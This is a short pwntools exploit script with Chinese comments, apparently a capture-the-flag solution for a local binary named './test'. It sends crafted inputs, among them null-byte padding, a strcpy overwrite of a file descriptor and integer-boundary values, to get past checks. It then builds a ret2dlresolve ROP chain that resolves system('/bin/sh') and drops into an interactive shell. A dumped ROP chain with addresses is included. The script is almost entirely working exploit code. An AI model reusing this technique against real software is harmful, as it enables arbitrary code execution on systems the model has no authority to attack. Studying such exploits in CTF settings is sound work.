# -*- coding: utf-8 -*-
from pwn import *

context.log_level = "debug"

r = process("./test")

rop = ROP("./test")
elf = ELF("./test")

r.send("\x00")
raw_input(">")
r.send('A'*0x20)
raw_input(">")

# strcpy 经典带 0 覆盖，把 flag_addr 的文件描述符覆盖成 0 即可过 check
# 到达栈溢出点

r.send("hello_boy\x00")
raw_input(">")

# 调用 read( 0 , src ,0x10 )输入过检查 

r.sendline("-2147483648")
raw_input(">")
r.sendline("-1")
raw_input(">")
#raw_input是一个输入函数，也可以直接sleep

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve( dlresolve )
#用的是pwntools的模板

info(rop.dump()) #查看rop信息


raw_input(">")

gdb.attach(r)

r.sendline(fit({0x4C: rop.chain(), 0x100: dlresolve.payload}))
#0x4c是写入rop链的地方，0x100是read读入的大小。
#fit就是填充一下

"""
0x0000:        0x80490c4 read(0, 0x804de00)   对应jump指令   实际用0x80490c0处的指令
0x0004:        0x8049582 <adjust @0x10> pop edi; pop ebp; ret    平衡栈
0x0008:              0x0 arg0       参数1
0x000c:        0x804de00 arg1       参数2  bss段
0x0010:        0x8049030 [plt_init] system(0x804de20)      push  plt_base ; jmp dl_resolve  
0x0014:           0x5a04 [dlresolve index]      index  不需要改
0x0018:          b'gaaa' <return address>       返回地址
0x001c:        0x804de20 arg0
0x804de00
"""

r.interactive()
